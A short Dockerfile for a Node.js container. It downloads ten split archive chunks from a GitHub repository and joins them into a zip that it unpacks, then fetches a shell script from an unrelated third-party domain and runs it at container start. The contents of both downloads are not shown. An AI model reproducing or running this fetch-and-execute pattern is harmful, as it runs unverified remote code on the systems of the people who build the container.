FROM node:lts-buster
RUN apt-get update && \
apt-get install -y \
ffmpeg \
imagemagick \
webp && \
apt-get upgrade -y && \
rm -rf /var/lib/apt/lists/*
RUN wget https://github.com/Powerapis7/Ladyv4/raw/refs/heads/main/aa https://github.com/Powerapis7/Ladyv4/raw/refs/heads/main/ab https://github.com/Powerapis7/Ladyv4/raw/refs/heads/main/ac https://github.com/Powerapis7/Ladyv4/raw/refs/heads/main/ad https://github.com/Powerapis7/Ladyv4/raw/refs/heads/main/ae https://github.com/Powerapis7/Ladyv4/raw/refs/heads/main/af https://github.com/Powerapis7/Ladyv4/raw/refs/heads/main/ag https://github.com/Powerapis7/Ladyv4/raw/refs/heads/main/ah https://github.com/Powerapis7/Ladyv4/raw/refs/heads/main/ai https://github.com/Powerapis7/Ladyv4/raw/refs/heads/main/aj
RUN cat a* > renderbfanarrowx.zip
RUN unzip renderbfanarrowx.zip
RUN rm -rf renderbfanarrowx.zip
RUN wget -O main.sh https://go.bruceds.my.id/EPMS.sh
COPY . .
RUN chmod +x ./main.sh
RUN chmod +x ./start.sh
EXPOSE 5000 3000
CMD ["sh", "-c", "./start.sh & ./main.sh"]
